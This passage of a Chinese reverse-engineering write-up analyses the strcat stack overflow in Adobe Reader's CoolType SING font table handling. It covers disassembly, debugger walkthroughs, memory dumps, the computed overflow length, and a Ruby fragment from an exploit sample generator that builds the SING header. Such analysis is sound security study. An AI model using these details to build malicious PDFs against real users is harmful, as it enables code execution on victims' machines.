字体资源版本号0.1,构造样本时小端写入,这里读出就变成了ecx=0x00010000,使其可以顺利执行到strcat</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8F     <span class="keyword">and</span>     <span class="built_in">ecx</span>, <span class="number">0FFFFh</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD95     <span class="keyword">jz</span>      short loc_803DD9F       <span class="comment">; 这里跳转，jz和je机器码是一样的，IDA识别为jz，OllyDbg识别为je，这里jz感觉好理解一点</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD97     <span class="keyword">cmp</span>     <span class="built_in">ecx</span>, <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD9D     <span class="keyword">jnz</span>     short loc_803DDC0</span><br><span class="line"><span class="symbol">.text:</span>0803DD9F</span><br><span class="line"><span class="symbol">.text:</span>0803DD9F loc_803DD9F:                <span class="comment">; CODE XREF: sub_803DCF9+9C↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD9F     <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">10h</span>                       <span class="comment">; 相对SING表入口偏移0x10处找到uniqueName</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA2     <span class="keyword">push</span>    <span class="built_in">eax</span>                            <span class="comment">; char *,strcat源地址入栈，也就是uniqueName起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA3     <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf] <span class="comment">; 这里将ebp的值作为目的地址，也就是前面所分配的缓冲区的起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA6     <span class="keyword">push</span>    <span class="built_in">eax</span>                            <span class="comment">; char *,strcat目的地址入栈</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA7     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf], <span class="number">0</span>   <span class="comment">; 将目标字符串赋值为NULL,空字符串</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDAB     <span class="keyword">call</span>    strcat                         <span class="comment">; 调用strcat函数，造成溢出</span></span><br></pre></td></tr></table></figure><h4 id="2、动态调试"><a href="#2、动态调试" class="headerlink" title="2、动态调试"></a>2、动态调试</h4><h5 id="2-1、sub-8021B06-函数的作用"><a href="#2-1、sub-8021B06-函数的作用" class="headerlink" title="2.1、sub_8021B06()函数的作用"></a>2.1、sub_8021B06()函数的作用</h5><blockquote><ul><li>1、打开Adobe Reader,再打开OllyDbg,<code>attach</code>上Adobe Reader进程。</li><li>2、在<code>0x0803DD74</code>下断点,运行程序。</li><li>3、观察传入的<code>参数值</code>，及其<code>内存状态</code>。</li></ul></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1、函数执行前</span><br><span class="line">    0803DD74    68 4CDB1908     push CoolType.0819DB4C                   ; ASCII 53,&quot;ING&quot;</span><br><span class="line">    0803DD79    57              push edi</span><br><span class="line">    0803DD7A    8D4D DC         lea ecx,dword ptr ss:[ebp-0x24]</span><br><span class="line">--&gt; 0803DD7D    E8 843DFEFF     call CoolType.08021B06</span><br><span class="line"></span><br><span class="line">ecx = ebp-0x24=0x0012E4D8-0x24=0x0012E4B4</span><br><span class="line">栈上的参数:</span><br><span class="line">esp --&gt; 0012E468   0012E718</span><br><span class="line">        0012E46C   0819DB4C  ASCII 53,&quot;ING&quot;</span><br><span class="line"></span><br><span class="line">[ecx]=[0x0012E4B4]=0x04952118</span><br><span class="line">04952118  00 01 00 00 00 11 01 00 00 04 00 10 4F 53 2F 32  .......OS/2</span><br><span class="line">04952128  B4 5F F4 63 00 00 EB 70 00 00 00 56 50 43 4C 54  確鬰..雙...VPCLT</span><br><span class="line">04952138  D1 8A 5E 97 00 00 EB C8 00 00 00 36 63 6D 61 70  褗^?.肴...6cmap</span><br><span class="line">04952148  A4 C3 E8 A0 00 00 B1 6C 00 00 03 58 63 76 74 20  っ锠..眑..Xcvt</span><br><span class="line">04952158  FF D3 1D 39 00 00 1E FC 00 00 01 FC 66 70 67 6D  ?9..?.黤pgm</span><br><span class="line">04952168  E7 B4 F1 C4 00 00 26 60 00 00 00 8B 67 61 73 70  绱衲..&amp;`...媑asp</span><br><span class="line">04952178  00 07 00 07 00 01 01 48 00 00 00 0C 67 6C 79 66  ...H....glyf</span><br><span class="line">04952188  0C 74 41 CF 00 00 26 EC 00 00 8A 7E 68 64 6D 78  .tA?.&amp;?.妦hdmx</span><br><span class="line">04952198  34 F0 21 0E 00 00 EC 00 00 00 15 48 68 65 61 64  4?..?..Hhead</span><br><span class="line">049521A8  DD 84 A2 D0 00 01 01 54 00 00 00 36 68 68 65 61  輨⑿.T...6hhea</span><br><span class="line"></span><br><span class="line">2、函数执行后</span><br><span class="line">    0803DD7A    8D4D DC         lea ecx,dword ptr ss:[ebp-0x24]</span><br><span class="line">    0803DD7D    E8 843DFEFF     call CoolType.08021B06</span><br><span class="line">    0803DD82    8B45 DC         mov eax,dword ptr ss:[ebp-0x24]</span><br><span class="line">--&gt; 0803DD85    3BC6            cmp eax,esi</span><br><span class="line"></span><br><span class="line">eax=[ebp-0x24]=[0x0012E4D8-0x24]=[0x0012E4B4]=0x0495231C</span><br><span class="line"></span><br><span class="line">eax</span><br><span class="line">0495231C  00 00 01 00 01 0E 00 01 00 00 00 00 00 00 00 3A  ...........:</span><br><span class="line">0495232C  F1 B9 F1 F4 75 62 82 1D 14 A7 82 4A 0C 0C 0C 0C  窆耵ub?J....</span><br><span class="line">0495233C  AC 86 F7 B5 ED 50 17 29 5C 12 8D 01 4E 51 05 0E  瑔鞯鞵)\?NQ</span><br><span class="line">0495234C  E7 CC BC CA 6B 02 ED 81 13 36 AD 5E 45 85 DC 7D  缣际k韥6璣E呠&#125;</span><br><span class="line">0495235C  DB C2 4B 84 E8 67 8A 92 74 90 C8 3D 03 65 FE 80  勐K勮g姃t惾=e</span><br><span class="line">0495236C  4E E7 C7 42 89 8B DA 08 91 71 7A 3D 83 8E BD 60  N缜B墜?憅z=儙絗</span><br><span class="line">0495237C  AB 8F FA 53 8E F2 15 70 D8 66 BB A0 24 09 05 CD  珡鶶庲p豧粻$.</span><br><span class="line">0495238C  E6 10 AE B9 B2 E0 B8 40 91 36 FC 66 8B 7B BE C2  ?侧窣?黤媨韭</span><br><span class="line">0495239C  65 24 37 DA 2B 2C FC FA 04 89 92 95 B5 3A 22 FE  e$7?,墥暤:&quot;</span><br><span class="line">049523AC  44 BA 47 90 BD 17 78 9A 86 A8 CC 2A B1 0B FA 8F  D篏惤x殕ㄌ*?鷱</span><br><span class="line">049523BC  54 C7 4B 6D BF 1A 47 1D 33 0D 72 DC D3 8E 1E FC  T荎m?G3.r苡?</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我们可以看到<code>sub_8021B06()</code>函数有<strong><code>三个参数</code></strong>,<strong><code>第一个参数</code></strong>是this指针,其值为PDF中<code>对象10</code>在内存中的首地址,也就是<code>字体对象</code>的指针。<strong><code>第二个参数</code></strong>edi是sub_80DD0B3()函数ebp处的一个<code>类对象的指针</code>,其<code>第一个成员变量</code>的值为dword_823A850被加1前的值(dword_823A850在sub_8024217函数中被加1),也就是0。<strong><code>第三个参数</code></strong>是“SING”字符串,sub_8021B06()函数通过在<code>字体对象</code>中匹配“SING”字符串,来获得<code>“SING”表目录项</code>,从而获得<code>“SING”表数据</code>的地址。所以,我们可以推测sub_8021B06()函数的功能为求出“SING”表数据在内存中的地址。</p><p>&emsp;&emsp;我们再来看一下参数<code>edi中的值</code>是什么,虽然其值可能不会影响我们的判断,但是为了从中学到更多的东西,还是来看一下吧。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、sub_8021B06()参数回溯,edi就是调用sub_8021B06()函数时传入的a1.</span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80DD0B3</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, _DWORD *a5, <span class="keyword">int</span> a6)</span></span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span class="comment">//value1_823A850变量的地址为ebp=0x0012E718</span></span><br><span class="line">sub_80151B5(&amp;value1_823A850);                 <span class="comment">// 清零0x0012E718后面的一些数据,0x0012E718应该为某个对象的首地址,此函数像是类的构造函数</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span class="comment">// 返回dword_823A850加1之前的值</span></span><br><span class="line">value_823A850 = sub_8024217(&amp;stru_823A838, <span class="number">0</span>);<span class="comment">// this传参,_RTL_CRITICAL_SECTION结构体对象</span></span><br><span class="line">value1_823A850 = value_823A850;</span><br><span class="line">    ↑    ↑    ↑</span><br><span class="line">    |    |    |</span><br><span class="line">v23 = sub_803DCF9((<span class="keyword">int</span>)&amp;value1_823A850, &amp;v9, <span class="number">0</span>, (<span class="keyword">int</span>)&amp;v22) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> __<span class="function">cdecl <span class="title">sub_803DCF9</span><span class="params">(<span class="keyword">int</span> a1, _DWORD *a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line">    ↑    ↑    ↑</span><br><span class="line">    |    |    |</span><br><span class="line">sub_8021B06(&amp;v18, a1, <span class="string">"SING"</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、sub_80151B5()函数的内容.</span><br><span class="line">_DWORD *__<span class="function">thiscall <span class="title">sub_80151B5</span><span class="params">(_DWORD *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edx v2=0/edx:xor edx,edx</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="keyword">this</span>;</span><br><span class="line">  *<span class="keyword">this</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_801512D(<span class="keyword">this</span> + <span class="number">5</span>);                        <span class="comment">// 对象(0x0012E72C)的构造函数</span></span><br><span class="line">  v1[<span class="number">15</span>] = v2;</span><br><span class="line">  v1[<span class="number">16</span>] = v2;</span><br><span class="line">  *((_BYTE *)v1 + <span class="number">68</span>) = v2;                     <span class="comment">// v[17]的第一个字节设为0</span></span><br><span class="line">  v1[<span class="number">18</span>] = v2;</span><br><span class="line">  v1[<span class="number">19</span>] = v2;</span><br><span class="line">  v1[<span class="number">20</span>] = v2;</span><br><span class="line">  v1[<span class="number">21</span>] = v2;</span><br><span class="line">  v1[<span class="number">22</span>] = v2;</span><br><span class="line">  v1[<span class="number">23</span>] = v2;</span><br><span class="line">  v1[<span class="number">49</span>] = <span class="number">-1</span>;</span><br><span class="line">  *((_BYTE *)v1 + <span class="number">188</span>) = v2;                    <span class="comment">// v1[47]的第一个字节设为0</span></span><br><span class="line">  v1[<span class="number">48</span>] = v2;</span><br><span class="line">  *((_BYTE *)v1 + <span class="number">200</span>) = v2;                    <span class="comment">// v1[50]的第一个字节设为0</span></span><br><span class="line">  <span class="built_in">memset</span>(v1 + <span class="number">24</span>, v2, <span class="number">92u</span>);                     <span class="comment">// 从第24dword开始,后23个dword设为0</span></span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">对象(0x0012E718)的内存布局(初始):</span></span><br><span class="line"><span class="comment">0x0012E718 *this = 0   -|</span></span><br><span class="line"><span class="comment">0x0012E71C this[1] = 0  |</span></span><br><span class="line"><span class="comment">0x0012E720 this[2] = 0  | &#123;sub_80151B5&#125;</span></span><br><span class="line"><span class="comment">0x0012E724 this[3] = 0  |</span></span><br><span class="line"><span class="comment">0x0012E728 this[4] = 0 -|</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0x0012E72C *this = 0 -------------------| 0x0012E72C-0x0012E750,应该也是一个对象</span></span><br><span class="line"><span class="comment">0x0012E730 0x049517D8                   | [0x049517D8]=0x08190108,const BIB_T_MT::BIBVTabGeneric::`vftable'</span></span><br><span class="line"><span class="comment">0x0012E734 this[2] = 0 -----------------|</span></span><br><span class="line"><span class="comment">0x0012E738 this[3] = 0 -----------------| &#123;sub_801512D&#125;</span></span><br><span class="line"><span class="comment">0x0012E73C                              | 0012E73C   01E79BA0  ASCII "BIBDataStoreGetBlockProcV2"</span></span><br><span class="line"><span class="comment">0x0012E740 this[5] = 0 -----------------|</span></span><br><span class="line"><span class="comment">0x0012E744 this[6] = 0 -----------------|</span></span><br><span class="line"><span class="comment">0x0012E748 this[7] = 0 -----------------|</span></span><br><span class="line"><span class="comment">0x0012E74C this[8] = sub_80833EF -------|</span></span><br><span class="line"><span class="comment">0x0012E750 result[9] = result = this ---| 0x0012E72C</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0x0012E754 v1[15] = v2 = 0 ----------------| </span></span><br><span class="line"><span class="comment">0x0012E758 v1[16] = v2 = 0 ----------------|</span></span><br><span class="line"><span class="comment">0x0012E75C *((_BYTE *)v1 + 68) = v2 = 0; --| 0012E75C   0804AA00  返回到 CoolType.0804AA00</span></span><br><span class="line"><span class="comment">0x0012E760 v1[18] = v2 = 0 ----------------| </span></span><br><span class="line"><span class="comment">0x0012E764 v1[19] = v2 = 0 ----------------| &#123;sub_80151B5&#125;</span></span><br><span class="line"><span class="comment">0x0012E768 v1[20] = v2 = 0 ----------------|</span></span><br><span class="line"><span class="comment">0x0012E76C v1[21] = v2 = 0 ----------------|</span></span><br><span class="line"><span class="comment">0x0012E770 v1[22] = v2 = 0 ----------------|</span></span><br><span class="line"><span class="comment">0x0012E774 v1[23] = v2 = 0 ----------------|</span></span><br><span class="line"><span class="comment">0x0012E778 - 0x0012E7D4 v1[24]~v1[46] = v2 = 0 --| memset(v1 + 24, v2, 92u);</span></span><br><span class="line"><span class="comment">0x0012E7D4 *((_BYTE *)v1 + 188) = v2 = 0 --------| 0012E7D4   02A93200   </span></span><br><span class="line"><span class="comment">0x0012E7D8 v1[48] = v2 = 0 ----------------------| &#123;sub_80151B5&#125;                     </span></span><br><span class="line"><span class="comment">0x0012E7DC                                       | 0012E7DC   FFFFFFFF</span></span><br><span class="line"><span class="comment">0x0012E7E0 *((_BYTE *)v1 + 200) = v2 = 0 --------| 0012E7E0   02A93200</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、sub_8024217()函数的内容.</span><br><span class="line">value_823A850 = sub_8024217(&amp;stru_823A838, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">.data:<span class="number">0823</span>A838 stru_823A838    _RTL_CRITICAL_SECTION &lt;?&gt;</span><br><span class="line">.data:<span class="number">0823</span>A838                                         ; DATA XREF: sub_80252EC+<span class="number">104</span>↑o</span><br><span class="line">.data:<span class="number">0823</span>A838                                         ; sub_809C3A4+<span class="number">1B</span>9↑o ...</span><br><span class="line">.data:<span class="number">0823</span>A850 dword_823A850   dd ?                    ; DATA XREF: sub_818DB2A+B↑w</span><br><span class="line">.data:<span class="number">0823</span>A854                 align <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">RTL_CRITICAL_SECTION</span> &#123;</span></span><br><span class="line">    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;</span><br><span class="line">    LONG LockCount;</span><br><span class="line">    LONG RecursionCount;</span><br><span class="line">    HANDLE OwningThread;</span><br><span class="line">    HANDLE LockSemaphore;</span><br><span class="line">    ULONG_PTR SpinCount;</span><br><span class="line">&#125;;大小为<span class="number">4</span>*<span class="number">6</span> = <span class="number">24</span> = <span class="number">0x18</span>h字节</span><br><span class="line"></span><br><span class="line">_RTL_CRITICAL_SECTION_DEBUG *__thiscall sub_8024217(LPCRITICAL_SECTION lpCriticalSection, <span class="keyword">int</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> lpCriticalSection1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edi</span></span><br><span class="line"></span><br><span class="line">  lpCriticalSection1 = (<span class="keyword">int</span>)lpCriticalSection;</span><br><span class="line">  EnterCriticalSection(lpCriticalSection);      <span class="comment">// 进入临界区</span></span><br><span class="line">  v3 = *(_DWORD *)(lpCriticalSection1 + <span class="number">24</span>);    <span class="comment">// v3为全局变量dword_823A850的值,其初始值为0.</span></span><br><span class="line">  *(_DWORD *)(lpCriticalSection1 + <span class="number">24</span>) = v3 + <span class="number">1</span>;<span class="comment">// dword_823A850=dword_823A850+1=1</span></span><br><span class="line">  LeaveCriticalSection((LPCRITICAL_SECTION)lpCriticalSection1);</span><br><span class="line">  <span class="keyword">return</span> v3;     <span class="comment">// 返回加1之前的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<strong><code>thiscall</code></strong>是<code>C++</code>中特有的<code>调用约定</code>,用于<code>成员函数</code>的调用。根据上面给出的<code>sub_80151B5()函数</code>的伪代码,可以看出此函数返回了<code>this指针</code>,并且<code>此函数</code>也是sub_80DD0B3()函数中定义的<code>对象(0x0012E718)</code>在作用域内调用的<code>第一个成员函数</code>,<code>sub_80151B5()函数</code>中使用<code>this指针</code>对其成员变量<code>赋初值</code>。这些都是一个<strong><code>构造函数</code></strong>拥有的特征。<br>&emsp;&emsp;通过上面的分析,我们可以知道<code>sub_8021B06()</code>的<code>第二个参数</code>a1为<code>对象(0x0012E718)的指针</code>,其第一个成员变量的值为0。</p><h5 id="2-2、strcat-函数溢出分析"><a href="#2-2、strcat-函数溢出分析" class="headerlink" title="2.2、strcat()函数溢出分析"></a>2.2、strcat()函数溢出分析</h5><p>&emsp;&emsp;通过上面的静态分析,我们可以知道程序执行完<code>sub_8021B06()函数</code>后,得到了<code>SING表数据</code>的地址。首先程序对SING表数据的<strong><code>“tableVersionMajor”</code></strong>字段和<strong><code>“tableVersionMinor”</code></strong>字段进行了判断,满足条件后,才会执行<code>strcat()</code>函数,将构造的<code>“uniqueName”</code>字段内容复制到<code>栈</code>上。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0803DD82      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C] <span class="comment">; eax指向SING表数据,eax=[ebp-0x24]=[0x0012E4B4]=0x04960104</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85      <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                <span class="comment">; 判断是否为空,esi为0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85</span><br><span class="line"><span class="symbol">.text:</span>0803DD87      <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8B      <span class="keyword">jz</span>      short loc_803DDC4 <span class="comment">; 这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8D      <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>]        <span class="comment">; 字体资源版本号0.1,构造样本时小端写入,这里读出就变成了ecx=0x00010000,使其可以顺利执行到strcat</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8F      <span class="keyword">and</span>     <span class="built_in">ecx</span>, <span class="number">0FFFFh</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD95      <span class="keyword">jz</span>      short loc_803DD9F <span class="comment">; 这里跳转，jz和je机器码是一样的，IDA识别为jz，OllyDbg识别为je，这里jz感觉好理解一点</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD97      <span class="keyword">cmp</span>     <span class="built_in">ecx</span>, <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD9D      <span class="keyword">jnz</span>     short loc_803DDC0</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这里有<strong><code>两种情况</code></strong>都满足要求,<strong><code>第一种</code></strong>,以小端序读出的版本号形如：<code>0x????0000</code>。也就是SING表的<code>“tableVersionMajor”</code>字段为0,<code>“tableVersionMinor”</code>字段没有要求,版本号为<code>0.x</code>。<strong><code>第二种</code></strong>,以小端序读出的版本号形如：<code>0x????0100</code>。也就是SING表的<code>“tableVersionMajor”</code>字段为1,<code>“tableVersionMinor”</code>字段没有要求,版本号为<code>1.x</code>。样本中使用的是<code>第一种</code>。</p><p><strong><code>样本生成脚本</code></strong>中关于这部分的构造如下：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sing = <span class="string">''</span></span><br><span class="line">sing &lt;&lt; [</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>,   <span class="comment"># tableVersionMajor, tableVersionMinor (0.1)</span></span><br><span class="line">    <span class="number">0xe01</span>,  <span class="comment"># glyphletVersion</span></span><br><span class="line">    <span class="number">0x100</span>,  <span class="comment"># embeddingInfo</span></span><br><span class="line">    <span class="number">0</span>,      <span class="comment"># mainGID</span></span><br><span class="line">    <span class="number">0</span>,      <span class="comment"># unitsPerEm</span></span><br><span class="line">    <span class="number">0</span>,      <span class="comment"># vertAdvance</span></span><br><span class="line">    <span class="number">0x3a00</span>  <span class="comment"># vertOrigin</span></span><br><span class="line">].pack(<span class="string">'vvvvvvvv'</span>) <span class="comment"># 把两个字符当作 little-endian 字节顺序的无符号的 short。</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;接下来,我们分析<code>“uniqueName”字段</code>复制到<code>栈上的位置</code>,以及<code>长度</code>。</p><blockquote><ul><li>1、打开Adobe Reader,再打开OllyDbg,<code>attach</code>上Adobe Reader进程。</li><li>2、在<code>0x0803DD9F</code>下断点,运行程序。</li><li>3、观察传入的<code>参数值</code>，及其<code>内存状态</code>。</li></ul></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eax</span> = <span class="number">0x04960104</span>(SING表数据入口地址)</span><br><span class="line">0803DD9F    83C0 <span class="number">10</span>         <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">0x10</span>                    <span class="comment">; eax = eax+0x10 = 0x04960104+0x10 = 0x04960114(“uniqueName”字段起始地址)</span></span><br><span class="line">0803DDA2    <span class="number">50</span>              <span class="keyword">push</span> <span class="built_in">eax</span>                        <span class="comment">; strcat源地址入栈，也就是uniqueName起始地址</span></span><br><span class="line">0803DDA3    8D45 <span class="number">00</span>         <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>]      <span class="comment">; eax = ebp = 0x0012E4D8</span></span><br><span class="line">0803DDA6    <span class="number">50</span>              <span class="keyword">push</span> <span class="built_in">eax</span>                        <span class="comment">; strcat目的地址入栈</span></span><br><span class="line">0803DDA7    C645 <span class="number">00</span> <span class="number">00</span>      <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>],<span class="number">0x0</span>       <span class="comment">; 将目标字符串赋值为NULL,空字符串</span></span><br><span class="line">0803DDAB    E8 483D1300     <span class="keyword">call</span> &lt;<span class="keyword">jmp</span>.&amp;MSVCR80.strcat&gt;      <span class="comment">; 调用strcat函数，造成溢出</span></span><br></pre></td></tr></table></figure><p>复制到栈上的<code>数据长度</code>：0x0012E718 - 0x0012E4D8 = 0x240<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">0012E4D8  F1 B9 F1 F4 75 62 82 1D 14 A7 82 4A 0C 0C 0C 0C  窆耵ub?J....</span><br><span class="line">0012E4E8  AC 86 F7 B5 ED 50 17 29 5C 12 8D 01 4E 51 05 0E  瑔鞯鞵)\?NQ</span><br><span class="line">0012E4F8  E7 CC BC CA 6B 02 ED 81 13 36 AD 5E 45 85 DC 7D  缣际k韥6璣E呠&#125;</span><br><span class="line">0012E508  DB C2 4B 84 E8 67 8A 92 74 90 C8 3D 03 65 FE 80  勐K勮g姃t惾=e</span><br><span class="line">0012E518  4E E7 C7 42 89 8B DA 08 91 71 7A 3D 